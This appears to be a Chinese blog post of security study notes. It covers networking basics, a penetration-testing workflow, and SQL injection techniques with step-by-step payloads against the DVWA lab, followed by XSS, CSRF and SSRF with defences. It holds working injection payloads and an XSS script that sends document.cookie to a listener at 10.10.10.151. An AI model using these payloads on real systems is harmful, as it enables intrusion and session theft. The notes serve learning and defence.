    <content><![CDATA[<h2 id="osi七层模型"><a href="#osi七层模型" class="headerlink" title="osi七层模型"></a>osi七层模型</h2><h3 id="第七层-应用层"><a href="#第七层-应用层" class="headerlink" title="第七层:应用层"></a>第七层:应用层</h3><p>功能:提供各种各样的应用层协议,为用户与网络之间提供一个打交道的接口。<br>常见协议:TELENT,DNS,HTTP,HTTPS,FTP,NFS<br>协议介绍:<br>TELENT:使用远程计算机上所拥有的本地计算机没有的信息资源，是常用的远程控制Web服务器的方法<br>DNS(域名解析协议):将域名解析为IP地址<br>HTTP(超文本传输协议):规定web服务端和客户端的数据传输格式<br>HTTPS(超文本传输安全协议):是HTTP加上TLS&#x2F;SSL协议构成的可加密传输的网络协议<br>FTP(文件传输协议):网络共享文件传输<br>NFS(网络文件系统):用户和程序可以像访问本地文件一样访问远端系统上的文件。</p>
<h3 id="第六层-表示层"><a href="#第六层-表示层" class="headerlink" title="第六层:表示层"></a>第六层:表示层</h3><p>功能:提供应用层数据的公共表示,即统一数据格式,从而使得数据能在两个系统中传输。<br>常见协议:LPP<br>协议介绍:<br>LPP(轻量级会话协议):描述了在某些受限条件下提供基于 TCP&#x2F;IP 网络的 OSI 应用程序服务器的流线支持的方法。</p>
<h3 id="第五层-会话层"><a href="#第五层-会话层" class="headerlink" title="第五层:会话层"></a>第五层:会话层</h3><p>功能:负责应用程序之间建立、维持和中断会话，同时也提供对设备和结点之间的会话控制，协调系统和服务之间的交流，并通过提供单工、半双工和全双工3种不同的通信方式，使系统和服务之间有序地进行通信。<br>常见协议:LDAP<br>协议介绍:<br>LDAP(轻型目录访问协议):通过IP协议提供访问控制和维护分布式信息的目录信息</p>
<h3 id="第四层-传输层"><a href="#第四层-传输层" class="headerlink" title="第四层:传输层"></a>第四层:传输层</h3><p>功能:主要功能负责数据传输时端到端的完整性，即在网络上建立发送主机和目的主机之间的逻辑连接，从而隐藏了上一层提供数据传输时任何网络独立信息。<br>常见协议:TCP,UDP,TLS<br>协议介绍:<br>TCP(传输控制协议):一种面向连接的、可靠的、基于字节流的传输层通信协议<br>UDP(用户数据报协议):面向事务的简单不可靠信息传送服务<br>TLS(传输层安全协议):在两个通信应用程序之间提供保密性和数据完整性</p>
<h3 id="第三层-网络层"><a href="#第三层-网络层" class="headerlink" title="第三层:网络层"></a>第三层:网络层</h3><p>功能:负责数据从一个结点到另一个结点的传输，并根据地址（IP&#x2F;IPX地址），为信息在网络中传输是选择最佳路径。<br>常见协议:IP,ICMP,ICMPv6,ARP,RARP<br>协议介绍:<br>IP(网络互联协议):为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务<br>ICMP(Internet控制报文协议):是一种面向无连接的协议，用于传输出错报告控制信息<br>ICMPv6(互联网控制信息协议版本六):为了与IPv6配套使用而开发的互联网控制信息协议,向源节点报告关于目的地址传输IPv6包的错误和信息，具有差错报告、网络诊断、邻节点发现和多播实现等功能<br>ARP(地址解析协议):据IP地址获取物理地址的一个TCP&#x2F;IP协议<br>RARP(反向地址转换协议):发出要反向解析的物理地址并希望返回其对应的IP地址，应答包括由能够提供所需信息的RARP服务器发出的IP地址</p>
<p>设备：路由器</p>
<h3 id="第二层-数据链路层"><a href="#第二层-数据链路层" class="headerlink" title="第二层:数据链路层"></a>第二层:数据链路层</h3><p>功能:主要功能是负责信息从一个结点到另一人结点的物理传输，检测在物理层上传输可能发生的错误并进行纠错，同时处理网络拓扑结构和流量控制等问题。<br>常见协议:VLAN,STP,IEEE 802.3,WIFI(IEEE 802.11),ATM,HDLC,PPP<br>协议介绍:<br>VLAN(虚拟局域网):根据功能、部门及应用等因素将设备或用户组织起来，相互之间的通信就好像它们在同一个网段中一样<br>STP(生成树协议):应用于计算机网络中树形拓扑结构建立，主要作用是防止网桥网络中的冗余链路形成环路工作<br>IEEE 802.3:定义了有线以太网的物理层和数据链路层的介质访问控制 （MAC）<br>WIFI(无线通信技术):实现无线上网<br>ATM(异步传输网):用户平面——是用户协议之间的接口如IP或SMDS和ATM等协议的接口互相协调;管理平面——使ATM栈的各层互相协调;控制平面——使信令传送以及虚电路的建立和拆除互相协调。<br>HDLC(高级数据链路控制):帧控制,帧同步,差错控制,流量控制,链路管理,透明传输,寻址,异常状态恢复<br>PPP(点对点协议):用来通过拨号或专线方式建立点对点连接发送数据，使其成为各种主机、网桥和路由器之间简单连接的一种共通的解决方案</p>
<p>设备：网桥，交换机</p>
<h3 id="第一层-物理层"><a href="#第一层-物理层" class="headerlink" title="第一层:物理层"></a>第一层:物理层</h3><p>功能:主要功能是直接在物理传输介质上发送和接收数据位，为数据链路层提供物理连接。</p>
<p>设备：网卡，网线，集线器，中继器，调制解调器</p>
<h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><p> <strong>2XX——表明请求被正常处理了</strong></p>
<p>1、200 OK：请求已正常处理。</p>
<p>2、204 No Content：请求处理成功，但没有任何资源可以返回给客户端，一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<p>3、206 Partial Content：是对资源某一部分的请求，该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</p>
<p><strong>3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</strong></p>
<p>4、301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</p>
<p>5、302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</p>
<p>6、303 See Other：资源的URI已更新，你是否能临时按新的URI访问。该状态码表示由于请求对应的资源存在着另一个URL，应使用GET方法定向获取请求的资源。303状态码和302状态码有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。</p>
<p>当301,302,303响应状态码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。</p>
<p>7、304 Not Modified：资源已找到，但未符合条件请求。该状态码表示客户端发送附带条件的请求时（采用GET方法的请求报文中包含If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since中任一首部）服务端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304.。</p>
<p>8、307 Temporary Redirect：临时重定向。与302有相同的含义。</p>
<p><strong>4XX——表明客户端是发生错误的原因所在</strong></p>
<p>9、400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</p>
<p>10、401 Unauthorized：该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。</p>
<p>11、403 Forbidden：不允许访问那个资源。该状态码表明对请求资源的访问被服务器拒绝了。（权限，未授权IP等）</p>
<p>12、404 Not Found：服务器上没有请求的资源。路径错误等。</p>
<p><strong>5XX——服务器本身发生错误</strong></p>
<p>13、500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</p>
<p>14、503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</p>
<h2 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>cookie是一种无状态的协议</p>
<p>原理：</p>
<p><img src="/image/image-20220602191657566.png" alt="image-20220602191657566"></p>
<p>相当于给客户端分发了一个id卡，第一次登录获取，第二次服务端通过客户端携带的id卡来确认身份，即优缺点非常明显：</p>
<p>优点：流程简单快速</p>
<p>缺点：容易遭到篡改；大小受到限制，一般为4kb</p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>session功能和cookie类似，不过有一定区别</p>
<p>原理：</p>
<p><img src="/image/image-20220602191623108.png" alt="image-20220602191623108"></p>
<p>session顾名思义，即会话，是一种特殊的cookie。客户端访问服务端后，将状态以session的形式保存在服务端，此时再将该会话的id卡分发到客户端，再次访问服务端时，只需要从该session中查找该客户端的状态即可。</p>
<p>优点：更加安全</p>
<p>缺点：更占用服务器性能</p>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>故区别有：cookie是保存在客户端，session保存在服务端</p>
<h2 id="渗透测试的流程和思路（外网打点等）"><a href="#渗透测试的流程和思路（外网打点等）" class="headerlink" title="渗透测试的流程和思路（外网打点等）"></a>渗透测试的流程和思路（外网打点等）</h2><h3 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h3><p>确认测试范围，如ip段，域名，站点等；对渗透目标进行判断，能进行渗透的程度。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>主动式信息搜集：得到的信息比较及时，获取到的信息更多，但容易被目标发现</li>
</ul>
<p>通过直接发起连接的方式来搜集目标信息，如各种扫描器（nmap等）进行扫描、手动测试等</p>
<ul>
<li>被动式信息搜集：搜集到的信息可能会有一定延时，获取到的信息较少，但更加隐蔽</li>
</ul>
<p>如果有外网，可搜索引擎关键词或语法搜索（<code>inurl=</code>等）、zoomeye等网络资产测绘引擎等，查找资产暴露面</p>
<h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><p>获取域名所有者的信息，包括姓名，公司，邮箱等，可以反查旁站、用于社会工程学的利用等。</p>
<h4 id="域名解析搜集"><a href="#域名解析搜集" class="headerlink" title="域名解析搜集"></a>域名解析搜集</h4><p>如果目标使用了cdn或其他方式隐藏了真实ip，可以尝试通过查找历史解析，旁站或子域名解析等方法来查找真实ip</p>
<h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>很多情况下，子域名可能和主站是相同服务器，如果主站没有发现突破口或者渗透难度较大，可尝试收集子域名，或从旁站寻找漏洞突破口</p>
<h4 id="真实ip获取"><a href="#真实ip获取" class="headerlink" title="真实ip获取"></a>真实ip获取</h4><p>首先判断目标是否采用了cdn</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br></pre></td></tr></table></figure>

<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>通常情况下，建站者为了方便，会直接采用常见的CMS、框架或者中间件等，比较常见的建站系统都会有明显的指纹特征，网上公开的漏洞或者源码也会比较多，通过相应指纹识别，可以一定程度上帮助渗透过程</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>nmap，masscan等进行扫描目标开放端口以及获取端口banner，确定端口对应的服务以及版本</p>
<h4 id="旁站c段查询"><a href="#旁站c段查询" class="headerlink" title="旁站c段查询"></a>旁站c段查询</h4><p>通过入侵安全性较差的旁站，c段（测试站点），可通过提权、跨目录等手段拿到目标服务器的权限</p>
<p><strong>httpscan：通过爬虫的方式扫描指定c段的网站信息</strong></p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><h4 id="前端信息泄露"><a href="#前端信息泄露" class="headerlink" title="前端信息泄露"></a>前端信息泄露</h4><p>一些前端的静态文件（静态文件目录，js，css等）和静态接口，可能泄露敏感数据</p>
<h4 id="敏感目录扫描，备份文件等"><a href="#敏感目录扫描，备份文件等" class="headerlink" title="敏感目录扫描，备份文件等"></a>敏感目录扫描，备份文件等</h4><p>通过手动fuzz或者扫描器扫描，搜集目标站点的敏感目录或者备份文件等等。不一定要能够访问，也可以从前端或者报错的信息来判断</p>
<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>前台或后台登陆点可能存在弱口令</p>
<h4 id="注册点"><a href="#注册点" class="headerlink" title="注册点"></a>注册点</h4><p>注册点一般是比较敏感的，如果开放了注册功能，可能拿到一些普通的用户权限</p>
<h4 id="上传点"><a href="#上传点" class="headerlink" title="上传点"></a>上传点</h4><p>常见的上传点有：头像上传，文章图片上传，富文本编辑器等</p>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>网站未对输入的字符进行过滤或者合法性校验，可通过拼接，拦截，绕过黑名单等方式来执行恶意命令</p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>网站进行sql查询的点，如果未对传入的数据进行过滤，可猜测和拼接sql查询语句来执行恶意查询</p>
<h4 id="已知组件CVE或存在exp的漏洞"><a href="#已知组件CVE或存在exp的漏洞" class="headerlink" title="已知组件CVE或存在exp的漏洞"></a>已知组件CVE或存在exp的漏洞</h4><p>通过指纹识别获取到的目标组件、版本信息</p>
<h3 id="后续渗透"><a href="#后续渗透" class="headerlink" title="后续渗透"></a>后续渗透</h3><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>通过漏洞探测到的可用漏洞进行进一步操作，例如webshell等</p>
<h2 id="sql注入的方式"><a href="#sql注入的方式" class="headerlink" title="sql注入的方式"></a>sql注入的方式</h2><h3 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h3><ul>
<li>数字型</li>
<li>字符型（输入型）</li>
</ul>
<p>判断：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 9999 --+		#正常返回则为字符型，报错则为数字型</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>假设语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> $id;</span><br></pre></td></tr></table></figure>

<p>字符型中，注释内容会被当作id的一部分（字符串），在执行sql语句的过程中只会取前面的1，所以会正常执行</p>
<img src="/image/image-20221019153748911.png" alt="image-20221019153748911" style="zoom:80%;" />

<p>而在数字型中，后面的order by会被当做排序语句执行，而正常数据库中不会有9999个字段，所以会报错</p>
<img src="/image/image-20221019154129333.png" alt="image-20221019154129333" style="zoom:80%;" />





<h3 id="按数据提交方式"><a href="#按数据提交方式" class="headerlink" title="按数据提交方式"></a>按数据提交方式</h3><ul>
<li>GET</li>
<li>POST</li>
<li>HTTP头部（XXF，cookie等）</li>
</ul>
<h3 id="按执行效果"><a href="#按执行效果" class="headerlink" title="按执行效果"></a>按执行效果</h3><ul>
<li>基于报错的注入：有报错或其他回显</li>
</ul>
<p>能将攻击者想要查询的信息（数据库名，版本号等）通过页面的错误提示回显；</p>
<p>前提条件：数据库未关闭报错函数，后台未对具有报错功能的函数进行过滤</p>
<p>常用的报错函数：extractvalue()、updatexml()、floor()、exp()等</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#								#判断字段数</span><br><span class="line">1&#x27; union select 1,2,3#						#判断字段的位置</span><br><span class="line">1&#x27; union select 1,2,database()#				#爆数据库名，*要查询的信息最好在每一个位置上都试试*</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>基于布尔的盲注：根据返回页面执行是否正确来判断是否成功</li>
</ul>
<p>不会直接显示查询的内容，只会返回查询是否成功；布尔运算是数字符号化的逻辑推演法，包括联合、相交、相减。在图形处理操作中引入了这种逻辑运算方法以使简单的基本图形组合产生新的形体（说人话：可以从字符的挨个比较来得出想要的信息）</p>
<p>重要函数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">count()										<span class="comment">#计算结果集的行数</span></span><br><span class="line">length(str)									<span class="comment">#返回指定字符串的长度</span></span><br><span class="line">substr/substring(str, index, length)		<span class="comment">#返回截取的子字符串</span></span><br><span class="line">ascii(str)									<span class="comment">#返回指定字符串最左侧字符的ascii值</span></span><br></pre></td></tr></table></figure>

<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#数据库名：dvwa/第一个表名：guestbook</span><br><span class="line"></span><br><span class="line">1&#x27; and length(database()) = 4#					#判断数据库名长度</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1)) = 100#		#判断数据库名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;) = 2#	#判断数据库中表的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) = 103#								  #判断第一个表名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27;) = 3#					#判断列的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99#		#判断列名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(comment_id) from dvwa.guestbook) = 1#		#判断字段的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select concat(comment_id,0x23,comment) from dvwa.guestbook),1,1)) = 49#</span><br></pre></td></tr></table></figure>



<ul>
<li>基于时间的盲注：不能从返回结果判断，只能通过时间函数（sleep等）延时来判断</li>
</ul>
<p>时间盲注大致和布尔盲注差不多，只不过是通过是否延时来判断执行成功与否</p>
<p>重要函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(boolean, exp1, exp2)		#如果为true，返回exp1，反之返回exp2</span><br><span class="line">sleep(sec)					#延时执行</span><br></pre></td></tr></table></figure>

<p>大致流程和布尔型差不多，把布尔换成靠延时来判断即可</p>
<img src="/image/image-20220603154747972.png" alt="image-20220603154747972" style="zoom: 67%;" />

<ul>
<li>联合查询注入：通常适用于有回显和显示位置有差异性的注入</li>
</ul>
<p>重要函数：union</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#				#判断字段数，多了会报错</span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#		#判断相应字段的显示位置</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#	#通过information_schema查询dvwa中的表名</span><br></pre></td></tr></table></figure>



<ul>
<li>堆叠注入：可以通过分号间隔同时执行多条语句的注入</li>
<li>宽字节注入</li>
</ul>
<p>正常使用addslashes函数或者开启php的GPC时，为了防止特殊字符污染，会自动将预定义字符转义成加反斜杠的字符串；而使用了指定编码的语句<code>set name &#39;gbk&#39;</code>时，相当于自动执行了三条语句（客户端，连接层，结果集都设置为GBK）；而宽字节注入就是发生在php发送请求到mysql时使用了<code>set name &#39;gbk&#39;</code>进行了一次gbk编码，由于一些特殊的字符集转换导致了宽字节注入。</p>
<p>原理：</p>
<p>在php中指定mysql为GBK编码，而php使用UTF-8编码时可造成宽字节注入</p>
<p>比如下面情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：1&#x27; union select 1,2#</span><br><span class="line">转义：1\&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p>单引号被转义成了 \‘ ，故语法不正确，因此我们需要想办法去掉这个右斜线；mysql在使用GBK编码的时候，会认为两个字符是一个汉字，并且前一个ascii码大于128时才到汉字的范围；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2# -&gt; 1\&#x27; union select 1,2# -&gt; 1%5C%27%20union%20select%201%2C2%23 #此时%5C%27还是\&#x27;</span><br><span class="line"></span><br><span class="line">?id=1%df&#x27; union select 1,2# -&gt; 1[汉字]\&#x27; union select 1,2# -&gt; 1%DF%5C%27%20union%20select%201%2C2%23	#此时%DF%5C组成了一个汉字（gbk编码认为两个字符是一个汉字），而%27也就是单引号成功逃逸</span><br></pre></td></tr></table></figure>



<ul>
<li>二次注入：</li>
</ul>
<p>利用已经储存的账户数据读取后再次进入查询语句中导致注入（说人话：已经写进数据库的内容，可以把他拿出来再次放进sql查询语句的情况）</p>
<p>一般步骤：</p>
<ol>
<li>确定攻击目标账户名（admin）</li>
<li>注册恶意账户（admin’– -）</li>
<li>修改恶意账户密码</li>
<li>使用修改的密码登录目标账户</li>
</ol>
<p>原理：</p>
<p>假设注册用户的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users (username, password) values(&quot;$username&quot;, &quot;$password&quot;);</span><br></pre></td></tr></table></figure>

<p>并且没有进行严格过滤，我们可以通过注册恶意用户名来注入，猜测修改密码的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;$username&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时我们可以构造恶意payload为：<code>admin&#39;-- -</code> ，拼合后的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时admin’– - 之后的内容包括确认原密码的语句被注释，等同于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>可在不知情的情况下直接修改admin的密码。</p>
<h2 id="sql注入报错函数"><a href="#sql注入报错函数" class="headerlink" title="sql注入报错函数"></a>sql注入报错函数</h2><ul>
<li>extractvalue函数</li>
</ul>
<p>payload：<code>1&#39; and (extractvalue(1,concat(0x5c,(select user()))))#</code></p>
<p><img src="/image/image-20220603212657619.png" alt="image-20220603212657619"></p>
<ul>
<li>updatexml函数</li>
</ul>
<p>payload：<code>1&#39; and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))#</code></p>
<p><img src="/image/image-20220603212942036.png" alt="image-20220603212942036"></p>
<ul>
<li>floor函数</li>
</ul>
<p>利⽤ floor(),count(),group by 的冲突报错</p>
<p>payload：<code>1&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
<p><img src="/image/image-20220603214105995.png" alt="image-20220603214105995"></p>
<ul>
<li>exp函数</li>
</ul>
<p>payload：<code>1&#39; and exp(~(select * from (select user())a))#</code></p>
<h2 id="sql注入的几个比较重要的点"><a href="#sql注入的几个比较重要的点" class="headerlink" title="sql注入的几个比较重要的点"></a>sql注入的几个比较重要的点</h2><ul>
<li>information_schema数据库里面有很多比较重要的信息，高权限数据库用户可以通过这个数据库来获得很多信</li>
<li>information_schema数据库的schemata表，可以看到所有的数据库名（schema_name字段）</li>
<li>直接查询schema_name字段会返回很多个字段，可能把字段位置占完了，导致显示不全</li>
</ul>
<img src="/image/image-20221019134510438.png" alt="image-20221019134510438" style="zoom: 80%;" />

<p>我们可以通过group_concat()函数来进行分组显示，视为一个字段，可以通过这种方法爆出所有的信息</p>
<img src="/image/image-20221019134622050.png" alt="image-20221019134622050" style="zoom:67%;" />

<p><strong>注：</strong>group_concat结合union查询时（<code>select 1,2,group_concat</code>）需要放在最后，否则会报错，如果不放在最后则要用<code>select 1,(select group_concat),3;</code></p>
<img src="/image/image-20221019143426972.png" alt="image-20221019143426972" style="zoom:80%;" />

<img src="/image/image-20221019143631446.png" alt="image-20221019143631446" style="zoom:80%;" />



<ul>
<li>information_schema数据库的tables表，可以看到所有数据库的表名（table_name）及对应的数据库名（table_schema）</li>
<li>可以使用<code>select group_concat(table_name)from(information_schema.tables)where table_schema = &#39;数据库名&#39;;</code></li>
<li>information_schema数据库的columns表，可以看到所有字段名（column_name）及对应的数据库名（table_schema）和表名（table_name）</li>
<li>可以使用<code>select group_concat(column_name)from(information_schema.columns)where table_name = &#39;表名&#39;;</code></li>
<li></li>
</ul>
<h2 id="xss的方式"><a href="#xss的方式" class="headerlink" title="xss的方式"></a>xss的方式</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>从服务端返回脚本，在客户端触发执行发起攻击，一般通过需要url触发（需要受害者点开链接就能生效，不然只能搞自己。。）</p>
<p><strong>防御方法：</strong>前端在显示的时候过滤或转义危险字符以及标签</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>像评论区或者文章等，可以将恶意脚本存储到服务器，每个浏览到该页面的客户端就会触发执行</p>
<p><strong>防御方法：</strong>对发布内容进行过滤再储存到数据库，读取数据库前端显示的时候再进行一次过滤</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>取决于输出位置，既可以是储存型也可以是反射型；dom是一种树状模型</p>
<img src="/image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1XzEyMzQ1Njc=,size_16,color_FFFFFF,t_70pic_center.png" alt="在这里插入图片描述"  />

<p>页面到达浏览器时，浏览器会自动创建一个Document object对象，每个页面元素都对应一个文档对象，客户端可以通过js脚本对这个对象进行动态修改，基于这个特性可以利用js脚本实现xss攻击。</p>
<p>例：</p>
<p>返回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&#x27;img&#x27;);img.src=&#x27;http://10.10.10.151:1234/a?&#x27;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>nc监听1234端口</p>
<img src="/image/image-20220604141005170.png" alt="image-20220604141005170" style="zoom:80%;" />



<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>admin用户登录了A网站后台，浏览器保存了admin的cookie，此时攻击者搭建恶意网站B，其中携带一段向A网站请求的恶意代码，引诱admin用户来到恶意网站B（相同浏览器），此时admin用户携带有A网站后台的cookie，然而admin用户不知情，B网站存在恶意请求（如修改密码，发送邮件等），直接使用admin用户携带的cookie，以admin用户的身份向A网站发送恶意请求。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>基本有三种方法</p>
<h4 id="HTTP-Referer字段"><a href="#HTTP-Referer字段" class="headerlink" title="HTTP Referer字段"></a>HTTP Referer字段</h4><p>优点：简单易行</p>
<p>缺点：referer字段仅由浏览器提供，不能排除浏览器有其他漏洞的情况，很难保证其真实性，并且某些隐私浏览器不提供referer，可能导致正常用户无法使用功能</p>
<h4 id="token验证或验证码"><a href="#token验证或验证码" class="headerlink" title="token验证或验证码"></a>token验证或验证码</h4><p>csrf能实现的重点无非就是可以在用户不知情的情况下伪造用户请求，我们只需要在其中加入一段黑客无法伪造的字段即可，即token或者验证码，不过难点在于如何对接token和验证码的验证，并且如果在每个请求都添加这种验证方式是很麻烦的</p>
<h4 id="http中自定义属性"><a href="#http中自定义属性" class="headerlink" title="http中自定义属性"></a>http中自定义属性</h4><p>通过xmlhttprequest将token放入http头中进行验证，不过xmlhttprequest一般用于异步请求，且重构网站复杂度高</p>
<h4 id="SameSite字段"><a href="#SameSite字段" class="headerlink" title="SameSite字段"></a>SameSite字段</h4><p>在set-cookies参数中添加SameSite字段，如果是跨站请求直接不执行</p>
<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><img src="/image/v2-bca50003926a87fdd4be2c30d1828d70_1440w.jpg" alt="SSRF漏洞攻击原理及防御方案" style="zoom:80%;" />

<p>服务端请求伪造，攻击者在未取得服务器权限的情况下，利用服务器的漏洞，以服务器的身份向浏览器可达而攻击者不可达的服务器发送请求，再将不可达服务器返回的响应内容返回给攻击者，SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>过滤返回的信息，应用请求文件后（一般只会请求图片），先对返回内容进行校验，如果满足类型，再返回给用户，不满足则拒绝请求</li>
<li>ssrf一般是用作探测内网服务，我们可以限制ip段，如果是内网就拒绝请求</li>
<li>统一报错信息，比如探测端口的情况，黑客可通过报错判断是否开放，将报错信息全部统一即可</li>
<li>限制请求端口，比如限制80或者443等</li>
<li>限制不常用协议，http和https常用，可以防止file，gopher等协议引发问题</li>
<li>有些网站的域名可能没有解析到内网地址，但是可通过3XX的方式请求内网地址，在不必要的情况下可以禁止所有重定向请求</li>
</ol>
